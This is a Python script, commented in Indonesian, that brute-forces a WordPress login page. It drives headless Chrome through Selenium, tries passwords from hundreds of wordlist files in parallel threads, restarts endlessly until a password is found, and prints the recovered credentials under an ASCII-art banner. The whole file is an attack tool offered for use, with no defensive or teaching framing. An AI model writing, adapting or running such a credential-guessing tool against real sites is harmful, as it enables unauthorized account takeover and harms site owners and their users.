import os
import time
from tabulate import tabulate
from termcolor import colored
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import StaleElementReferenceException
from concurrent.futures import ThreadPoolExecutor, as_completed

def read_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as file:
        wordlist = file.read().splitlines()
    return wordlist

def brute_force(url, username, wordlists):
    results = []
    total_combinations = sum(len(read_wordlist(file)) for file in wordlists)
    combinations_tried = 0
    password_found = False

    with ThreadPoolExecutor() as executor:
        futures = []
        for wordlist_file in wordlists:
            wordlist = read_wordlist(wordlist_file)
            futures.append(executor.submit(check_login, url, username, wordlist))

        for future in as_completed(futures):
            success, password = future.result()
            combinations_tried += len(wordlist)
            progress = combinations_tried / total_combinations * 100
            print(f"Loading: {progress:.2f}% Complete", end="\r")

            if success:
                results.append((username, password, "Success"))
                password_found = True
                break

    return results

def check_login(url, username, wordlist):
    # Setup Selenium
    service = Service('path/to/chromedriver')  # Ganti dengan path ke chromedriver
    options = Options()
    options.add_argument('--headless')  # Menjalankan Chrome di mode headless
    driver = webdriver.Chrome(service=service, options=options)

    try:
        # Navigasi ke halaman login
        driver.get(url)

        # Cari elemen input username dan tombol submit
        input_username = driver.find_element(By.ID, "user_login")  # Ganti dengan nama elemen input username pada halaman login
        submit_button = driver.find_element(By.ID, "wp-submit")  # Ganti dengan nama elemen tombol submit pada halaman login

        for password in wordlist:
            try:
                input_password = driver.find_element(By.ID, "user_pass")  # Ganti dengan nama elemen input password pada halaman login
                input_password.clear()
                input_password.send_keys(password)
                submit_button.click()

                # Lakukan pengecekan apakah login berhasil
                # Contoh sederhana menggunakan URL setelah login
                if driver.current_url == "https://example.com/dashboard":  # Ganti dengan URL yang menunjukkan login berhasil
                    return True, password
            except StaleElementReferenceException:
                # Jika terjadi StaleElementReferenceException, cari ulang elemen yang dibutuhkan
                continue
    finally:
        driver.quit()

    return False, None

# Daftar file wordlist yang akan digunakan
wordlist_files = []
for i in range(1, 794):
    wordlist_files.append(f"db/wordlist_{i}.txt")

# Masukkan URL dan username
url = input("Masukkan URL: ")
username = input("Masukkan username: ")

# ASCII Art Header dengan 7 warna berbeda
banner = """
██████   ██████ ███████████    █████ ██████   █████ ██████████      ███████    ██████   ██████ ███████████  
░░██████ ██████ ░█░░░███░░░█   ░░███ ░░██████ ░░███ ░░███░░░░███   ███░░░░░███ ░░██████ ██████ ░░███░░░░░███ 
 ░███░█████░███ ░   ░███  ░     ░███  ░███░███ ░███  ░███   ░░███ ███     ░░███ ░███░█████░███  ░███    ░███ 
 ░███░░███ ░███     ░███        ░███  ░███░░███░███  ░███    ░███░███      ░███ ░███░░███ ░███  ░██████████  
 ░███ ░░░  ░███     ░███        ░███  ░███ ░░██████  ░███    ░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ 
 ░███      ░███     ░███        ░███  ░███  ░░█████  ░███    ███ ░░███     ███  ░███      ░███  ░███    ░███ 
 █████     █████    █████    ██ █████ █████  ░░█████ ██████████   ░░░███████░   █████     █████ █████   █████
░░░░░     ░░░░░    ░░░░░    ░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░░░░░░      ░░░░░░░    ░░░░░     ░░░░░ ░░░░░   ░░░░░ 
"""
colored_banner = colored(banner, "yellow", attrs=["bold", "underline"])
print(colored_banner)

# Buat log file
log_filename = "brute_force_log.txt"
log_file = open(log_filename, "a")

# Tulis informasi ke log file
log_file.write(f"URL: {url}\n")
log_file.write(f"Username: {username}\n\n")
log_file.write("Brute Force Log:\n")

# Jalankan fungsi brute_force dengan URL, username, dan file wordlist yang diberikan
start_time = time.time()
while True:
    brute_force_results = brute_force(url, username, wordlist_files)
    if brute_force_results:
        break
    else:
        print("No password found. Restarting brute force...")
        log_file.write("No password found. Restarting brute force...\n")
end_time = time.time()

# Tampilkan hasil dalam bentuk tabel
table_headers = ["Username", "Password", "Status"]
table_data = brute_force_results
table = tabulate(table_data, headers=table_headers, tablefmt="fancy_grid")
print(table)

# Tampilkan nama wordlist yang digunakan
print("\nWordlist used:")
for file in wordlist_files:
    print(file)

# Tampilkan waktu yang dibutuhkan
execution_time = end_time - start_time
print(f"\nExecution time: {execution_time:.2f} seconds")

# Tulis waktu eksekusi ke log file
log_file.write(f"\nExecution time: {execution_time:.2f} seconds\n")

# Tutup log file
log_file.close()

# Tampilkan lokasi log file
print(f"\nLog file saved: {os.path.abspath(log_filename)}")
